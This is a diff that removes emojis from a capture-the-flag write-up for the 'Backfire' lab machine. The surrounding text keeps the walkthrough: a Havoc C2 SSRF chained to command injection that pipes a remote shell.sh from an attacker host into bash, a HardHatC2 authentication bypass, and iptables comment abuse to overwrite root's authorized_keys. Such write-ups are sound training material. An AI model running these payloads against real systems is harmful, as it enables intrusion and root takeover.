@@ -22,7 +22,7 @@ Hints: True
 | 9    | `root`        | **Root Access**                         | Logged in via SSH as root using the overwritten key and retrieved `root.txt`.                                                         |                                      |
 
 
-## 🔍 Nmap Scan
+##  Nmap Scan
 
 ```bash
 [root@kali] /home/kali/Backfire  
@@ -69,7 +69,7 @@ Listeners {
 
 ---
 
-## 🔧 TLS Disabled Patch
+##  TLS Disabled Patch
 
 The patch disabled TLS and switched from `wss://` to `ws://` for WebSocket connections.
 
@@ -82,7 +82,7 @@ The patch disabled TLS and switched from `wss://` to `ws://` for WebSocket conne
 + if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 ```
 
-> 🔥 Havoc server is exposed and credentials are available, but direct connection fails.
+>  Havoc server is exposed and credentials are available, but direct connection fails.
 
 ---
 
@@ -93,9 +93,8 @@ The patch disabled TLS and switched from `wss://` to `ws://` for WebSocket conne
 * [Havoc-C2-SSRF-poc by chebuya](https://github.com/chebuya/Havoc-C2-SSRF-poc)
 * [c2-vulnerabilities by IncludeSecurity](https://github.com/IncludeSecurity/c2-vulnerabilities)
 
----
 
-### 📝 Attack Summary
+###  Attack Summary
 
 1. Forge agent registration → open a socket → upgrade HTTP to WebSocket
 2. Authenticate to teamserver
@@ -104,7 +103,7 @@ The patch disabled TLS and switched from `wss://` to `ws://` for WebSocket conne
 
 ---
 
-### ✅ Key HTTP Header for WebSocket Upgrade
+###  Key HTTP Header for WebSocket Upgrade
 
 ```http
 GET /chat HTTP/1.1
@@ -118,7 +117,7 @@ Sec-WebSocket-Version: 13
 
 ---
 
-### 🐍 Final Python Exploit Workflow
+###  Final Python Exploit Workflow
 
 ```python
 # Steps:
@@ -136,13 +135,13 @@ cmd = 'curl http://10.10.xx.xx/shell.sh | bash'
 injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
 ```
 
-> ✅ Successfully obtained `user.txt`
+> Successfully obtained `user.txt`
 
 ---
 
-## 🔐 Privilege Escalation (Root)
+##  Privilege Escalation (Root)
 
-### 1️⃣ Maintain Persistent Access
+### 1 Maintain Persistent Access
 
 On the reverse shell:
 
@@ -152,7 +151,7 @@ echo "your_public_ssh_key" >> ~/.ssh/authorized_keys
 
 ---
 
-### 2️⃣ HardHatC2 Authentication Bypass
+### 2 HardHatC2 Authentication Bypass
 
 SSH Proxy local ports:
 
@@ -195,12 +194,12 @@ burp0_json = {
 r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
 ```
 
-> ✅ User `sth_pentest` created successfully
-> ✅ Logged into `https://127.0.0.1:7096/` to get terminal access.
+>  User `sth_pentest` created successfully
+>  Logged into `https://127.0.0.1:7096/` to get terminal access.
 
 ---
 
-### 3️⃣ iptables Privilege Escalation
+### 3 iptables Privilege Escalation
 
 Bypass file restrictions by abusing iptables comments.
 
@@ -209,17 +208,10 @@ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n your_ed25519_pu
 sudo iptables-save -f /root/.ssh/authorized_keys
 ```
 
-> ✅ Persisted root SSH access
-> ✅ Finally retrieved `root.txt`
+>  Persisted root SSH access
+>  Finally retrieved `root.txt`
 
----
 
-## ✅ Summary
 
-| Stage | Technique                                                                        |
-| ----- | -------------------------------------------------------------------------------- |
-| User  | SSRF → WebSocket Upgrade → Agent Forge → Command Injection → Reverse Shell       |
-| Root  | AuthN Bypass → Create TeamLead User → Abuse iptables comment → Overwrite SSH key |
-
-🔑 Successfully completed the box.
+ Successfully completed the box.
 
